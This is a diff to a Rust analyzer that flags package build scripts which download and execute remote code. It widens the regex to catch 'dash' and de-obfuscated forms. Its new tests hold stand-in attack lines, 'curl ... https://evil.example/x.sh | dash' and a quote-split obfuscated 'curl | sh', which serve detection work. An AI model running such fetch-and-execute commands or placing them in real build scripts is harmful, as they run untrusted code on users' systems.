@@ -14,7 +14,7 @@
 
 use super::SecurityAnalyzer;
 use crate::error::Result;
-use crate::textutil::logical_lines;
+use crate::textutil::{deobfuscate, logical_lines, INTERPRETERS, SHELLS};
 use crate::types::{AnalysisContext, Category, Finding, Location, Severity};
 use async_trait::async_trait;
 use lazy_static::lazy_static;
@@ -22,16 +22,22 @@ use regex::Regex;
 
 lazy_static! {
     /// A line that downloads and immediately executes remote content.
-    static ref FETCH_EXEC: Regex = Regex::new(
+    ///
+    /// The shell/interpreter sinks come from the shared `SHELLS`/`INTERPRETERS`
+    /// constants so every detector recognizes the same set -- notably `dash`,
+    /// which the previous inline `(ba|z|k|c|d|tc|fi)?sh` could never match
+    /// (`d?sh` is `dsh`/`sh`, not `dash`), letting `curl evil | dash` evade this
+    /// analyzer entirely (defect #6).
+    static ref FETCH_EXEC: Regex = Regex::new(&format!(
         r#"(?x)
-        (curl|wget|aria2c|fetch)\b[^\n]*\|\s*(ba|z|k|c|d|tc|fi)?sh\b   # download | shell
-        | (curl|wget|aria2c|fetch)\b[^\n]*\|\s*(python[23]?|perl|ruby|node|php|pwsh) # download | interp
-        | (ba|z|k|c|d|tc|fi)?sh\s+<\(\s*(curl|wget|fetch)\b            # sh <(curl ...)
-        | source\s+<\(\s*(curl|wget|fetch)\b                          # source <(curl ...)
-        | \beval\s+["']?\$\(\s*(curl|wget|fetch)\b                    # eval "$(curl ...)"
-        | \.\s+<\(\s*(curl|wget|fetch)\b                              # . <(curl ...)
+        (curl|wget|aria2c|fetch)\b[^\n]*\|\s*{SHELLS}\b              # download | shell
+        | (curl|wget|aria2c|fetch)\b[^\n]*\|\s*{INTERPRETERS}\b      # download | interpreter
+        | {SHELLS}\s+<\(\s*(curl|wget|fetch)\b                       # sh <(curl ...)
+        | source\s+<\(\s*(curl|wget|fetch)\b                         # source <(curl ...)
+        | \beval\s+["']?\$\(\s*(curl|wget|fetch)\b                   # eval "$(curl ...)"
+        | \.\s+<\(\s*(curl|wget|fetch)\b                             # . <(curl ...)
         "#
-    ).unwrap();
+    )).unwrap();
     /// Extract http(s) URLs (stop at shell/quote boundaries).
     static ref URL: Regex = Regex::new(r#"https?://[^\s"'`|)><(]+"#).unwrap();
 }
@@ -57,11 +63,24 @@ impl RemoteExecAnalyzer {
         for (phys_line, line) in logical_lines(text) {
             let line = line.as_str();
             let trimmed = line.trim_start();
-            if trimmed.starts_with('#') || !FETCH_EXEC.is_match(line) {
+            if trimmed.starts_with('#') {
                 continue;
             }
+            // Match the raw line, and -- so character-level obfuscation can't
+            // hide the fetch|exec -- its de-obfuscated form too (defect #6c).
+            // URLs are extracted from whichever variant matched so a decoded
+            // payload reports the real URL, not the obfuscated source text.
+            let decoded = deobfuscate(line);
+            let scan_line = if FETCH_EXEC.is_match(line) {
+                line
+            } else if decoded.as_deref().is_some_and(|d| FETCH_EXEC.is_match(d)) {
+                decoded.as_deref().unwrap()
+            } else {
+                continue;
+            };
             let idx = phys_line - 1;
-            let urls: Vec<String> = URL.find_iter(line).map(|m| clean_url(m.as_str())).collect();
+            let urls: Vec<String> =
+                URL.find_iter(scan_line).map(|m| clean_url(m.as_str())).collect();
             let where_ = if in_install { " (install script)" } else { "" };
             let url_msg = if urls.is_empty() {
                 "an external source".to_string()
@@ -84,7 +103,7 @@ impl RemoteExecAnalyzer {
                     file: file.to_path_buf(),
                     line: Some(idx + 1),
                     column: None,
-                    snippet: Some(line.trim().to_string()),
+                    snippet: Some(scan_line.trim().to_string()),
                 },
                 recommendation:
                     "Do not build. A package that pulls and runs code from an external URL is \
@@ -158,6 +177,33 @@ mod tests {
             false,
         );
         assert!(f.iter().any(|x| x.id == "EXEC-REMOTE"), "continuation-split fetch|exec must be caught");
+    }
+
+    #[test]
+    fn detects_curl_pipe_dash() {
+        // Defect #6: `dash` was matched nowhere. `curl ... | dash` must now fire.
+        let a = RemoteExecAnalyzer::new();
+        let f = a.scan(
+            "curl -fsSL https://evil.example/x.sh | dash",
+            Path::new("PKGBUILD"),
+            false,
+        );
+        assert!(f.iter().any(|x| x.id == "EXEC-REMOTE"), "curl|dash must be caught");
+    }
+
+    #[test]
+    fn detects_obfuscated_fetch_exec() {
+        // Defect #6c: a quote-split `"cu""rl" ... | sh` must be caught via
+        // de-obfuscation, and the real URL extracted from the decoded form.
+        let a = RemoteExecAnalyzer::new();
+        let f = a.scan(
+            r#""cu""rl" -fsSL https://evil.example/x.sh | sh"#,
+            Path::new("PKGBUILD"),
+            false,
+        );
+        assert_eq!(f.len(), 1, "obfuscated fetch|exec must be caught: {f:?}");
+        let urls = f[0].metadata["remote_urls"].as_array().unwrap();
+        assert_eq!(urls[0], "https://evil.example/x.sh");
     }
 
     #[test]
